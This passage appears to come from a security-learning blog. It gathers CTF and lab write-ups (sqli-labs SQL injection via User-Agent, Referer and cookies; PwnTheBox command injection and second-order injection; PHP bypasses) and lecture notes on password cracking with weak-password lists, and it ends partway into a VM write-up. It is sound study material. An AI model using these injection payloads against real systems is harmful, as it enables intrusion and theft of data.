echo \u0026#39;Your User Agent is: \u0026#39; .$uagent; echo \u0026#34;\u0026lt;/font\u0026gt;\u0026#34;; echo \u0026#34;\u0026lt;br\u0026gt;\u0026#34;; print_r(mysqli_error($con1)); echo \u0026#34;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026#34;; echo \u0026#39;\u0026lt;img src=\u0026#34;../images/flag.jpg\u0026#34; /\u0026gt;\u0026#39;; echo \u0026#34;\u0026lt;br\u0026gt;\u0026#34;; } ...... 可以看到这里=$uname= $passwd 都进行了 check_input() 的过滤，因此只能另辟蹊径 还有一条数据库操作语句是=INSERT= ，这里用到了 $uagent, $IP ，可以通过Burpsuite或者hackbar来修改header\n我们观察这条sql语句，我们能够修改的内容是$uagent的值，那么前后的两个=\u0026rsquo;= 就需要闭合，然后利用报错注入，插入sql语句，然后使原sql语句报错，得到需要的结果\nuser-agent=\u0026#39;and extractvalue(1,concat(0x7e,database(),0x7e)) and \u0026#39;1\u0026#39;=\u0026#39;1 lesson 19 先读一下源码\n$uname = check_input($con1, $_POST[\u0026#39;uname\u0026#39;]); $passwd = check_input($con1, $_POST[\u0026#39;passwd\u0026#39;]); ...... echo \u0026#39;\u0026lt;font color= \u0026#34;#FFFF00\u0026#34; font size = 3 \u0026gt;\u0026#39;; $insert=\u0026#34;INSERT INTO `security`.`referers` (`referer`, `ip_address`) VALUES (\u0026#39;$uagent\u0026#39;, \u0026#39;$IP\u0026#39;)\u0026#34;; mysqli_query($con1, $insert); ...... 与lesson-18的区别就是，这里的注入点在Referer,修改一下即可利用报错注入\nReferer=\u0026#39;and extractvalue(1,concat(0x7e,database(),0x7e)) and \u0026#39;1\u0026#39;=\u0026#39;1 lesson 20 根据提示，这道题是要利用cookie来进行注入，一看源代码发现比平时多出了好多，正好来练习一下读php\n第一次登陆 cookie中没有 uname 的值，进入当前if 用 check_input 过滤 uname 和 passwd 的值 如果成功查询后，将查询到的username存到 $cookee 中，同时 setcookie 来设置 cookie\nif(!isset($_COOKIE[\u0026#39;uname\u0026#39;])) { ...... if(isset($_POST[\u0026#39;uname\u0026#39;]) \u0026amp;\u0026amp; isset($_POST[\u0026#39;passwd\u0026#39;])) { $uname = check_input($con1, $_POST[\u0026#39;uname\u0026#39;]); $passwd = check_input($con1, $_POST[\u0026#39;passwd\u0026#39;]); $sql=\u0026#34;SELECT users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1\u0026#34;; $result1 = mysqli_query($con1, $sql); $row1 = mysqli_fetch_array($result1, MYSQLI_BOTH); $cookee = $row1[\u0026#39;username\u0026#39;]; if($row1) { echo \u0026#39;\u0026lt;font color= \u0026#34;#FFFF00\u0026#34; font size = 3 \u0026gt;\u0026#39;; setcookie(\u0026#39;uname\u0026#39;, $cookee, time()+3600); header (\u0026#39;Location: index.php\u0026#39;); echo \u0026#34;I LOVE YOU COOKIES\u0026#34;; echo \u0026#34;\u0026lt;/font\u0026gt;\u0026#34;; echo \u0026#39;\u0026lt;font color= \u0026#34;#0000ff\u0026#34; font size = 3 \u0026gt;\u0026#39;; // echo \u0026#39;Your Cookie is: \u0026#39; .$cookee; echo \u0026#34;\u0026lt;/font\u0026gt;\u0026#34;; echo \u0026#34;\u0026lt;br\u0026gt;\u0026#34;; print_r(mysqli_error($con1)); echo \u0026#34;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026#34;; echo \u0026#39;\u0026lt;img src=\u0026#34;../images/flag.jpg\u0026#34; /\u0026gt;\u0026#39;; echo \u0026#34;\u0026lt;br\u0026gt;\u0026#34;; } else { echo \u0026#39;\u0026lt;font color= \u0026#34;#0000ff\u0026#34; font size=\u0026#34;3\u0026#34;\u0026gt;\u0026#39;; //echo \u0026#34;Try again looser\u0026#34;; print_r(mysqli_error($con1)); echo \u0026#34;\u0026lt;/br\u0026gt;\u0026#34;; echo \u0026#34;\u0026lt;/br\u0026gt;\u0026#34;; echo \u0026#39;\u0026lt;img src=\u0026#34;../images/slap.jpg\u0026#34; /\u0026gt;\u0026#39;; echo \u0026#34;\u0026lt;/font\u0026gt;\u0026#34;; } } echo \u0026#34;\u0026lt;/font\u0026gt;\u0026#34;; echo \u0026#39;\u0026lt;/font\u0026gt;\u0026#39;; echo \u0026#39;\u0026lt;/div\u0026gt;\u0026#39;; } POST之后，response的header中可以看到设置的set-cookie\n如果cookie有值，那么进入当前 else,接着 $cookee 的值进行查询，此处就是可以注入的地方\nelse { if(!isset($_POST[\u0026#39;submit\u0026#39;])) { $cookee = $_COOKIE[\u0026#39;uname\u0026#39;]; $format = \u0026#39;D d M Y - H:i:s\u0026#39;; $timestamp = time() + 3600; echo \u0026#34;\u0026lt;center\u0026gt;\u0026#34;; echo \u0026#39;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026#39;; echo \u0026#39;\u0026lt;img src=\u0026#34;../images/Less-20.jpg\u0026#34; /\u0026gt;\u0026#39;; echo \u0026#34;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;b\u0026gt;\u0026#34;; echo \u0026#39;\u0026lt;br\u0026gt;\u0026lt;font color= \u0026#34;red\u0026#34; font size=\u0026#34;4\u0026#34;\u0026gt;\u0026#39;; echo \u0026#34;YOUR USER AGENT IS : \u0026#34;.$_SERVER[\u0026#39;HTTP_USER_AGENT\u0026#39;]; echo \u0026#34;\u0026lt;/font\u0026gt;\u0026lt;br\u0026gt;\u0026#34;; echo \u0026#39;\u0026lt;font color= \u0026#34;cyan\u0026#34; font size=\u0026#34;4\u0026#34;\u0026gt;\u0026#39;; echo \u0026#34;YOUR IP ADDRESS IS : \u0026#34;.$_SERVER[\u0026#39;REMOTE_ADDR\u0026#39;]; echo \u0026#34;\u0026lt;/font\u0026gt;\u0026lt;br\u0026gt;\u0026#34;; echo \u0026#39;\u0026lt;font color= \u0026#34;#FFFF00\u0026#34; font size = 4 \u0026gt;\u0026#39;; echo \u0026#34;DELETE YOUR COOKIE OR WAIT FOR IT TO EXPIRE \u0026lt;br\u0026gt;\u0026#34;; echo \u0026#39;\u0026lt;font color= \u0026#34;orange\u0026#34; font size = 5 \u0026gt;\u0026#39;; echo \u0026#34;YOUR COOKIE : uname = $cookee and expires: \u0026#34; . date($format, $timestamp); echo \u0026#34;\u0026lt;br\u0026gt;\u0026lt;/font\u0026gt;\u0026#34;; $sql=\u0026#34;SELECT * FROM users WHERE username=\u0026#39;$cookee\u0026#39; LIMIT 0,1\u0026#34;; $result=mysqli_query($con1, $sql); if (!$result) { die(\u0026#39;Issue with your mysql: \u0026#39; . mysqli_error($con1)); } $row = mysqli_fetch_array($result, MYSQLI_BOTH); 修改 cookie 即可利用注入\nlesson 21 看源码，和上一题基本类似，只不过这里多了一步base64加密，同时使用 （‘’） 进行包裹\n$cookee = base64_decode($cookee); echo \u0026#34;\u0026lt;br\u0026gt;\u0026lt;/font\u0026gt;\u0026#34;; $sql=\u0026#34;SELECT * FROM users WHERE username=(\u0026#39;$cookee\u0026#39;) LIMIT 0,1\u0026#34;; $result=mysqli_query($con1, $sql); 因此我们需要要先将我们的注入语句用base64加密，再注入\n-1\u0026#39;)union select 1,2,database()-- - lesson 22 读源码，与lesson 21类似，只不过改了包裹的方法 \u0026quot;\u0026quot;\n$cookee = base64_decode($cookee); $cookee1 = \u0026#39;\u0026#34;\u0026#39;. $cookee. \u0026#39;\u0026#34;\u0026#39;; echo \u0026#34;\u0026lt;br\u0026gt;\u0026lt;/font\u0026gt;\u0026#34;; $sql=\u0026#34;SELECT * FROM users WHERE username=$cookee1 LIMIT 0,1\u0026#34;; $result=mysqli_query($con1, $sql); -1\u0026#34;union select 1,2,database()-- - ","date":"2022-03-21T00:00:00Z","permalink":"https://ginkgo.org.cn/posts/sqli_labs_study/","title":"Sqli-labs Study: Basic Challenges"},{"content":"\u0026lt;!\u0026ndash;more\u0026ndash;\u0026gt;\nexec1 命令行执行 先读源码，\n首先，脚本用str_replace替换了所有特殊字符，由于是单独字符的替换，没有办法利用双写绕过，接着考虑下面命令行中如果执行额外的命令 通过%0A换行实现新的命令执行 ?ip=1%0Als 得到\n进而获取文件内容\n\u0026lt;?php // Get input $target = $_REQUEST[ \u0026#39;ip\u0026#39; ]; // var_dump($target); $target=trim($target); // var_dump($target); // Set blacklist $substitutions = array( \u0026#39;\u0026amp;\u0026#39; =\u0026gt; \u0026#39;\u0026#39;, \u0026#39;;\u0026#39; =\u0026gt; \u0026#39;\u0026#39;, \u0026#39;|\u0026#39; =\u0026gt; \u0026#39;\u0026#39;, \u0026#39;-\u0026#39; =\u0026gt; \u0026#39;\u0026#39;, \u0026#39;$\u0026#39; =\u0026gt; \u0026#39;\u0026#39;, \u0026#39;(\u0026#39; =\u0026gt; \u0026#39;\u0026#39;, \u0026#39;)\u0026#39; =\u0026gt; \u0026#39;\u0026#39;, \u0026#39;`\u0026#39; =\u0026gt; \u0026#39;\u0026#39;, \u0026#39;||\u0026#39; =\u0026gt; \u0026#39;\u0026#39;, ); // Remove any of the charactars in the array (blacklist). $target = str_replace( array_keys( $substitutions ), $substitutions, $target ); // var_dump($target); // Determine OS and execute the ping command. if( stristr( php_uname( \u0026#39;s\u0026#39; ), \u0026#39;Windows NT\u0026#39; ) ) { // Windows $cmd = shell_exec( \u0026#39;ping \u0026#39; . $target ); } else { // *nix $cmd = shell_exec( \u0026#39;ping -c 1 \u0026#39; . $target ); } // Feedback for the end user echo \u0026#34;\u0026lt;pre\u0026gt;{$cmd}\u0026lt;/pre\u0026gt;\u0026#34;; ?\u0026gt; 虽然这里不能使用，但是这里复习一下Windows和*nix的管道符号\nWindows系例支持的管道符如下所示。 “|”：直接执行后面的语句。例如：ping 127.0.0.1|whoami。 “||”：如果前面执行的语句执行出错，则执行后面的语句，前面的语句只能为假。例如：ping 2||whoami。 “\u0026amp;”：如果前面的语句为假则直接执行后面的语句，前面的语句可真可假。例如：ping 127.0.0.1\u0026amp;whoami。 “\u0026amp;\u0026amp;”：如果前面的语句为假则直接出错，也不执行后面的语句，前面的语句只能为真。例如：ping 127.0.0.1\u0026amp;\u0026amp;whoami。 Linux系统支持的管道符如下所示。 “;”：执行完前面的语句再执行后面的。例如：ping 127.0.0.1;whoami。 “|”：显示后面语句的执行结果。例如：ping 127.0.0.1|whoami。 “||”：当前面的语句执行出错时，执行后面的语句。例如：ping 1||whoami。 “\u0026amp;”：如果前面的语句为假则直接执行后面的语句，前面的语句可真可假。例如：ping 127.0.0.1\u0026amp;whoami。 “\u0026amp;\u0026amp;”：如果前面的语句为假则直接出错，也不执行后面的，前面的语句只能为真。例如：ping 127.0.0.1\u0026amp;\u0026amp;whoami。 hackergame2019-签到题 根据提示查看前一年的签到题的writeup，猜测token应该是hackergame2019，接下来就是如何提交token了\nTODO 网页读取器 管理员本地访问 本题考查Burp使用以及http header的理解，加上client-ip: 127.0.0.1即可在“本地”访问得到flag\n下载下载 先尝试下载flag.txt文件是空的\n根据源代码提示，查询flag.php文件 ?file=flag.php\n得到解密方法，放在本地服务器运行后得到flag\n\u0026lt;?php header(\u0026#39;Content-Type: text/html; charset=utf-8\u0026#39;); //网页编码 function encrypt($data, $key) { $key = md5 ( $key ); $x = 0; $len = strlen ( $data ); $l = strlen ( $key ); for($i = 0; $i \u0026lt; $len; $i ++) { if ($x == $l) { $x = 0; } $char .= $key {$x}; $x ++; } for($i = 0; $i \u0026lt; $len; $i ++) { $str .= chr ( ord ( $data {$i} ) + (ord ( $char {$i} )) % 256 ); } return base64_encode ( $str ); } function decrypt($data, $key) { $key = md5 ( $key ); $x = 0; $data = base64_decode ( $data ); $len = strlen ( $data ); $l = strlen ( $key ); for($i = 0; $i \u0026lt; $len; $i ++) { if ($x == $l) { $x = 0; } $char .= substr ( $key, $x, 1 ); $x ++; } for($i = 0; $i \u0026lt; $len; $i ++) { if (ord ( substr ( $data, $i, 1 ) ) \u0026lt; ord ( substr ( $char, $i, 1 ) )) { $str .= chr ( (ord ( substr ( $data, $i, 1 ) ) + 256) - ord ( substr ( $char, $i, 1 ) ) ); } else { $str .= chr ( ord ( substr ( $data, $i, 1 ) ) - ord ( substr ( $char, $i, 1 ) ) ); } } return $str; } $key=\u0026#34;Pwnthebox\u0026#34;; $flag=\u0026#34;g9yk1pqdmqHa3qTJlqTFZbmShKmjaMHKzpJprg==\u0026#34;; echo decrypt($flag,$key) ?\u0026gt; 快速计算 尝试计算后输入结果，是真的需要短时间内得到结果，使用python来实现一个脚本，首先GET获取公示，继而计算后POST返回，最后得到返回的flag\nimport requests, re url = \u0026#34;https://1239-e39bb701-ed06-4211-90bc-cabd6f666121.do-not-trust.hacking.run\u0026#34; s = requests.session() # get the GET result get_result= s.get(url) # use regular expression to find out the first result which end with pattern \u0026#34;\u0026lt;/p\u0026gt;\u0026#34; result = eval((re.findall(\u0026#34;\\S*(?=\u0026lt;/p\u0026gt;)\u0026#34;, get_result.text))[0]) post_result = s.post(url, data = {\u0026#34;result\u0026#34; : result}) print(post_result.text) 该网站已经被黑 在主页没有发现有用的信息 那么直接用dirmap直接扫目录\nPwnTheBox 查看源代码，获得提示flag在header里面\n放进Burp里看一下response，获得Flag\n百度网盘分享链接 题目提示类型为口令爆破，猜测应该是4位数字（不然也太多了）\n放到Burp里用Intruder扫描一下\nGet 阅读给出的源码，只要给一个GET参数，并且值为“flag”即可\n?what=flag\nPost 和上一题Get，类似，我们用hackbar，curl，burp，postman加上post参数的值就可以了\n睿智题目 利用burp的repeater反复获取，即可得到flag\n一道很奇怪的题目 一进去alert弹框，没有后端交互，也没法显示源码，推测flag在本地，查看本地js，发现js的最后是html encoded的flag\n解码之后可得 https://codebeautify.org/html-decode-string\n奇葩的题目 根据提示查看源码\n发现script执行将逃逸后的url编码过的代码，以此解码p1, p2 以及%35%34%61%61%32，得到script内容：\n得到满足等式的值，继而得到flag\n验证码 修改输入框长度限制，计算答案提交得到flag\nTODO XSS 达啦崩吧大冒险 观察源代码的JS代码中，与服务器交互的代码如下\n$(\u0026#34;#send\u0026#34;).click( function () { let v = $(\u0026#34;#input option:selected\u0026#34;).val(); addMsg(\u0026#34;我\u0026#34;, opts[parseInt(v)]); ws.send(v) } ); 其中v得赋值直接使用选项编号，存在注入的可能 在“料理大市场”可以买鸡提升攻击力，设置v = -1900000000000000000会发生大整数溢出，攻击力溢出出后调整魔王得到flag\natchap 个人认为这道题考查对于最新漏洞的了解以及探索 阅读题目同年的这篇文章Tchap: The super (not) secure app of the French government，可知这个app有漏洞，在于没有过滤用户的数据。后台通过识别列表中的邮件后缀名来选择服务器，我们只需要通过google找到一个已经注册的邮箱，就可以做到逃逸，并且在前面加上自己的邮箱就可以收到注册邮件\n那么在这道题中，founder信息以及底部的联系人信息告诉了我们绕过的格式，然后在前面添加任意的邮件地址即可返回flag\nphp是世界上最好的语言 阅读源码，需要满足几个条件，参数$a,$b的sha1加密后密文相等，key为json格式的值，并且该json数据中的一个键叫做“key”，值和参数$key相等\n\u0026lt;?php show_source(__FILE__); @include_once \u0026#39;flag.php\u0026#39;; //前端攻城狮跑路了，不过PHP是最好的语言 $a = $_GET[\u0026#39;a\u0026#39;]; $b = $_GET[\u0026#39;b\u0026#39;]; $good = false; if (sha1($a)===sha1($b)) { $good = true; } else die(\u0026#39;bypass\u0026#39;); if ($good \u0026amp;\u0026amp; isset($_GET[\u0026#39;key\u0026#39;])){ $message = json_decode($_GET[\u0026#39;key\u0026#39;]); if ($message-\u0026gt;key==$key) { echo $flag; } else die(\u0026#39;还差一点就拿到flag了\u0026#39;); } ?\u0026gt; 第一个条件很容易满足，直接让a=b即可 第二个条件，我们首先让这个值满足json格式{key:value},并且这个value等于$key,利用php的弱类型语言的性质，当数字与字符串进行比较时，字符串会转换成数字来进行比较，同时第一位不为数字时，会转换为0，因此我们将value设置为0，皆可得到flag\nexec2 先读PHP源代码\n\u0026lt;?php $ip = isset($_POST[\u0026#39;ip\u0026#39;])?$_POST[\u0026#39;ip\u0026#39;]:die(); if(!preg_match(\u0026#39;/^\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}/i\u0026#39;,$ip)){ die(\u0026#34;ip 格式错误!\u0026#34;); } echo strlen($ip); if(strlen($ip)\u0026lt;7||strlen($ip)\u0026gt;21){ die(\u0026#34;ip 长度错误!\u0026#34;); } // Determine OS and execute the ping command. if( stristr( php_uname( \u0026#39;s\u0026#39; ), \u0026#39;Windows NT\u0026#39; ) ) { // Windows $cmd = shell_exec( \u0026#39;ping \u0026#39; .$ip ); }else { // *nix $cmd = shell_exec( \u0026#39;ping -c 1 \u0026#39; .$ip ); } // Feedback for the end user echo \u0026#34;\u0026lt;pre\u0026gt;{$cmd}\u0026lt;/pre\u0026gt;\u0026#34;; 本题利用preg_match进行过滤，要求输入的 开头 为ipv4地址的格式，但是没有管后面添加的内容，同时要求长度的范围(7,21),因此我们将post的值设为 1.1.1.1;ls\n看到对应的txt文件，访问即可获得flag\n黑曜石浏览器 题目本身的意图比较好猜，通过在http的User-Agent头上加HEICORE浏览器，但是最新版本我一致没找到，还是看了其他的write-up才找到的\n信息安全 2077 时间点击按钮，提示412 - Precondition Failed，推测是请求的问题，用burp发送请求看response，注意到Last modified的时间被设置到了2077年。因此我们可以利用=If-Unmodified-Since= ： 指定的请求资源只有在字段值内定的日期时间之后，未发生更新的情况下，才能处理请求，同时将日期设到Last-Modifed之后，即可保证正常响应，否则以状态码 412 Precondition Failed 作为响应返回。 参考\n成绩查询 确认有sql注入，成功闭合有回显+注入语句执行\n爆数据库\n爆表名\n矛盾 $num=$_GET[\u0026#39;num\u0026#39;]; if(!is_numeric($num)) { echo $num; if($num==1) echo \u0026#39;flag{**********}\u0026#39;; } 读源码，很容易发现这里存在一个弱类型比较 ?num=1a 即可绕过得到flag\nTwice SQL Injection 根据提示是二次注入（也可以叫 Second-order injection ） 一般来说（就我所见过的），后端的脚本只会对注册所传输的变量进行严格的过滤，而在登陆的时候，却没有进行二次确认\n因此我们测试注册几个用户名\n# 测试是否可以登陆admin账号 admin-- - admin\u0026#39; -- - admin\u0026#34; -- - # 测试直接获取信息 -1 union select database()-- - -1\u0026#39; union select database()-- - #成功 -1\u0026#34; union select database()-- - -1\u0026#39;) union select database()-- - -1\u0026#34;) union select database()-- - 发现 -1' union select database()-- - 返回了database信息\n那么接下来就是正常流程\n-1\u0026#39; union select group_concat(table_name) from information_schema.tables where table_schema=\u0026#34;ctftraining\u0026#34;-- - -1\u0026#39; union select group_concat(column_name) from information_schema.columns where table_name=\u0026#34;flag\u0026#34;-- - -1\u0026#39; union select group_concat(flag, \u0026#39;, \u0026#39;) from flag-- - 即可获得flag\n","date":"2022-03-18T00:00:00Z","permalink":"https://ginkgo.org.cn/posts/pwnthebox_web_easy/","title":"Pwn The Box WEB-Easy"},{"content":"SCT Topic 8: Password Cracking Case Study: Adobe Password Leak If you are familiar with how online service store users\u0026rsquo;s password, let me ask you:\nHow Should You Do?\nYes, we will use hash algorithm, salt and store the hashed password and salt, which actively avoid the exposion of plaintext password and brute force.\nBut how Adobe Did It?\nWhat were the consequences?\nIf you get the master key, literally you own all \u0026ldquo;encrypted passwords\u0026rdquo; If two users choose same password, their encrypted ciphertext are same, consequently, frequently analysis would help hacker to find out the details of encryption process. For more details, please refer to this article: Anatomy of a password disaster – Adobe’s giant-sized cryptographic blunder\nCryptanalysis basics Cryptanalysis The study of techniques to reveal what cryptography is attempting to hide or protect. In other words, break the cryptographyic algorithms without knowing the key.\nCryptanalysis are based on:\nThe nature of the cryptographic algorithm the key some knowledge on the text, such as language(common words), format or encoding (script, image alway begin with some same pattern), a section with both plaintext and encrypted text Brute-force attacks Brute-force attack Aim to decrypt an encrypted text by exhaustively trying all possible secret keys until you obtain a meaningful plaintext On average, you need to try at least half of all the possible keys to be successful\nFor example, to brute force a 4-digit password, the number of possibilities is 10^4 = 10000, therefore, on average, a brute-force attack in this scenario will succeed after 5000 attempts. If 1 attempt cost 1s, it needs at least 1h24min to finish this work.\nDictionary attacks 4-digit password needs one hour and half? Forget about it, let\u0026rsquo;s to try something not so naive.\nLet\u0026rsquo;s first define the term \u0026ldquo;password\u0026rdquo; as a user-defined encrypted secret key.\nPassowrd dictionary attacks Use a \u0026ldquo;dictionary\u0026rdquo; of possbile words (based on an attacker-defined alphabet) to make exploitation attempts, including English words, user\u0026rsquo;s private information and common passwords. Common dictionaries for attacks include:\nWords and meaningful fragments of words combination for a certain language Personal information (e.g., obtained from OSINT or social engineering) Lists of names, locations, dates, companies, etc. Therefore, if the attackers use dictionary attack, the password length does not provide too much help on password robustness.\nPassword robustness There are four main elements to determine the security of a password\nNumber of symbols in the password As we mentioned before, 4-digit locker would require on average 10^4/2 seconds, or almost 1.5 hours to brute force, the longer password, the longer time to brute force. Number of possibilities for each position We continue use previous example, if we expand the types of symbols to alphabet and number, the possibilities expand to 36*36*36 for brute force, which requires much more time than 1.5 hours. Time required for each attempt Based on my experience, some online service will delay the login attempt to expand the time of brute force, which may also help to defend the attack like DDoS. Are there easier alternatives Remember we metioned in Social Engineering: \u0026ldquo;The easiest way to get the information you want is always by asking the victims themselves\u0026rdquo;? There are always more than one way to get the answer of a question, so does cryptanalysis, you can even physically break the lock :)\nSome common alternatives:\nfinding write-down notes in officers shoulder-surfing, i.e., looking over someone\u0026rsquo;s shoulder when they\u0026rsquo;re typing their passwords physical break-in physically stealing passwords lists or logbooks Cryptographic hash functions Hash function A function that maps input data of arbitrary size to fixed-size output values called hashes. Crytographic hash functions (CHF) are hash functions more suitable for information security applications which contains ideal following properties: deterministic: given message M, its hash H(M) is always the same quick to compute unfeasible to generate message M that has a specific hash value H (hard to find alternative message M') unfeasible to find messages M1 and M2 such that H(M1) = H(M2) (hard to find a collision) avalanche effect: a small change in message M leads to siginificant change to the hash value. Usage of CHF includes MACs (Message Authentication Codes), digital signatures and authentications.\nLet\u0026rsquo;s use an example for better understanding of CHF\nLeft hand column is the input, after cryptographic hash function, we get the output, we called Digest here.\nWe can observe that, a single character change of input text, the digest would be very different from previous one.\nAs you can easily guess, there are many problems and attacks which threat the CHF:\nThe birthday problem (or the birthday paradox) Let me ask you a classic question, how many people you need in a single room, which makes the probability that at least two person share a birthday to be 50%?\nYou only need 23 people to raise probability to 50 per cent.\nProve: The goal is to compute P(A), the probability that at least two people in the room have same birthday.\nHowever, it is simpler to calculate the reverse one, P(A\u0026rsquo;), the probability that NO two people in the room have the same birthday.\nTo calculate P(A\u0026rsquo;), the event is that person 2 does not have the same birthday as person 1, and that persona 3 does not have the same birthday as either person 1 or person 2, and so on, and finally that person 23 does not have the same birthday as any of persons 1 through 22.\nLet\u0026rsquo;s number this event as Event 1 to Event 23\nLet\u0026rsquo;s calculate the product of the probability of these events:\nEvaluating equation with (23) gives P(A\u0026rsquo;) ≈ 0.492703\nTherefore, P(A) ≈ 1 − 0.492703 = 0.507297 (50.7297%).\nAlso, according to the pigenhole principle, the probability reaches 100 per cent when at least 367 people are present since there are only 366 possible birthdays.\nBased on above knowledge, we can understand that birthday attack is based on higher likelihood of collisions found between random attack and fixed degree of permutations.\nCollision attack The collision attack aims to identify two inputs that generate the same hash.\nMore formally, we assume user has password P with hash H(P), an attacker may find another string Q, such that H(P) = H(Q)\nThis is why we need CHF to have the property to make it feasible to find the collision.\nPreimage attack The preimage attack aims to find a message that has a specific hash value\nMore formally, an adversary \u0026ldquo;tweaks\u0026rdquo; an input message M\u0026rsquo; until H(M\u0026rsquo;)=H(M)\nThis attack will put huge harm to the security property: Integrity, because if this kind of tweak success, we can not trust anything, even if it has been hashed.\nLet\u0026rsquo;s see an example:\nMessage M: Give Mr John Smith a salary increase of £1,000. This message will be digitally signed as a contract by CHF H.\nBut the attacker finds some alternatives of messages which change their meaning of the input message, but get the same output digest as H(M)\nMessage M’: Award Mr Smith a raise of £2,000 Message M\u0026rsquo;\u0026rsquo;: Present John Smith a bonus of £3,000 Same signed hash value, different meaning, how powerful it is\u0026hellip;\nMD5 collision exercise When we download some files/software, many of them will provide md5 authentication, to authenticate that the integrity of the software, however, here is a exercise that shows MD5 can not be trusted anymore.\nPlease review the details, I will just post something interesting here:\nLet\u0026rsquo;s see two programs like this:\nProgram 1: if (data1 == data1) then { good_program } else { evil_program } Program 2: if (data2 == data1) then { good_program } else { evil_program } The only difference between these two statements is the variable to compare, however, it has been proved by Chinese researchers that we can only change some data in the input source files, but get the same MD5 hash value, which announce the death of MD5.\nRainbow table attacks In this section, we will see a smarter variant of dictionary attack to do the brute force, it called pre-computed dictionary attack.\nIn this attack, we will pre-compute a list of hashes of dictionary words, and store in a table, which you can always easily to map the hashed text and plaintext password. If \u0026ldquo;hash-chain\u0026rdquo; functions are used to store the pre-computed hashes(to reduce the storage space), then the table is called a rainbow table.\nLet\u0026rsquo;s use an example to introduce the terms and processes in a Rainbow Table usage.\nThe letter H denotes a hash function.\nThe letters R_i denote different reduction functions, which aim to store more plaintext-hashed-text chains in the table (The number and sequences of reduction functions are same in each row).\nWe only store two columns of data in a system: 1. The first column (in green) and the last (in yellow).\nHow we utilise the rainbow table the plaintext of a given hashed text? Step 0 We find the hashed text \u0026quot;re3xes\u0026quot; in /etc/shadow directory of the victim, we want the plaintext of this password, and have a rainbow table which contains two columns (green and yellow). Step 1 We use the reduction function R3 on \u0026quot;re3xes\u0026quot; (start from last reduction function) and see if the result \u0026ldquo;rambo\u0026rdquo; is in the last column of the rainbow table. In this example it is not.\nStep 2 Next, try two rounds of reduction function, use reductions R2 and R3 and obtain \u0026ldquo;linux23\u0026rdquo; as the result.\nStep 3 Find the match\nStep 4 Start with matched plaintext column \u0026ldquo;passwd\u0026rdquo; and do the reductions to reach plaintext which will hashed to given hashed text \u0026ldquo;re3xes\u0026rdquo;.\nSummary We assume that the given hashed text are contained in the chains of a row in the rainbow table, and use a sequence of reduction functions and hash function to see if it could reach the last column. If there is match, then we could locate the row of first (green) column and begin to reproduce the chains and get the plaintext.\nSalt Remember that I mentioned a term in first section: Salt?\nRainbow table attacks and pre-computed dictionary attacks can be thwarted via the use of salt.\nThe reason is very simple, even if you can use pre-computed table based on some common use dictionaries, but you can predict what\u0026rsquo;s the salt are used in hashing.\nHere are the most common mistakes in applying salt:\nUsing short salts: if the salt is too short, the attacker may predict or brute-force pre-computed dictionaries with known salts.\nReusing salts: if you reuse the salt for multiple accounts, the attacker can easily find out that the plaintext passwords were the same, and use side-channel information (e.g., password hints) to corrupt multiple accounts at once.\nMoreover, if the attacker randomly predicted the correct salt while computing a precomputed dicionary, then all the passwords would be compromised at once.\nFinally it is important to note that using a ‘salt’ is not robust enough to thwart dictionary attacks, but only the pre-computation.\nCountermeasures and best practices Weak passwords Default passwords Default provided by system vendor which should be changed at installation time password default admin guest Dictionary words Including non-English dictionaries: chameleon RedSox sandbags bunnyhop IntenseCrabtree Words with numbers appended These can be easily tested automatically by attackers with little time cost. password1 deer2000 john1234 Words with simple obfuscations Still, it can be tested automatically with little additional effort p@ssw0rd l33th4x0r g0ldf1sh Doubled words crabcrab stopstop treetree passpass. Common sequences from a keyboard row qwerty (keyboard) 123456 asdfgh (keyboard) fred. Numeric sequences based on well known numbers such as 911 (9-1-1, 9/11) 314159\u0026hellip; (pi) 27182\u0026hellip; (e) 112 (1-1-2). Identifiers jsmith123 1/1/1970 555–1234 one\u0026rsquo;s username. Weak passwords in non-English languages contraseña (Spanish) ji32k7au4a83 (encoding from Chinese). Anything personally related to an individual All these can be easily tested automatically after a simple investigation of a person\u0026rsquo;s details, eg through social engineering. license plate number social security number current or past telephone numbers student ID number current address previous addresses birthday sports team relative\u0026rsquo;s or pet\u0026rsquo;s names, nicknames, birthdays, initials, etc. Dates Dates follow a pattern and make passwords weak. Common passwords from previous leaks For example, the top 10 most common passwords in a CNN article: 123456 123456789 qwerty password 111111 12345678 abc123 1234567 password1 Side-channel attacks As its name suggest, rather than exploiting the weakness of the algorithm itself (eg. cryptanalysis and software bugs), a side-channel attack relies on information gained from the implementation of a computer system.\nFor example:\ntiming information (eg, implement the encryption, hashing) power consumption electromagnetic leaks sound If you are familar with SQL injection, the time-based blind injection is also a side-channel attacks.\nLet\u0026rsquo;s look at the details of a timeing attack: By analyse time taken by the cryptographic algorithm implementation operation, the attacker is able to reverse engineer the input.\nIn 2003, Boneh and Brumley published a practical network-based timing attack on SSL-enabled web server, the server key was recovered in a matter of hours using this method.\nGood practice around passwords Do not reuse passwords Browser KeePassX Local Use password managers Use Two-Factor Authentication (2FA) ","date":"2022-03-18T00:00:00Z","permalink":"https://ginkgo.org.cn/posts/password_cracking/","title":"SCT Topic 8: Password Cracking"},{"content":"Writeup 我的尝试 拿到题目，看到OVA格式，直接在virtualbox中打开\n看到关键词wordpress，貌似是一个写blog的工具？\n启动后发现需要登陆，根据师傅的提示没有过多纠缠，应该是要通过一个网页来入手\n这时候想到以前用ssh连接虚拟机的时候，往往用vmware启动虚拟机后不用管登陆，直接用ssh就可以，说明后台服务其实已经启动，加上需要网页的线索，想到通过分配到的局域网IP地址找到网页\nifconfig | grep \u0026#34;inet\u0026#34; 再次启动后，查看网络配置，观察到出现了一个新的局域网\n然后通过nmap进行扫描，确认目标网络地址\n尝试两个ip地址，确认登陆到目标网站为192.168.56.118。 在开场动画中观察到一组用户名:密码,root:â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢ 但是似乎没有办法直接输入特殊字符，应该也不重要，暂时放弃\n在终端界面尝试linux命令，均是同样的报错：Error: Command not recognized. Type help for a list of commands.\n此时我打开Burp Suite开始拦截http请求， 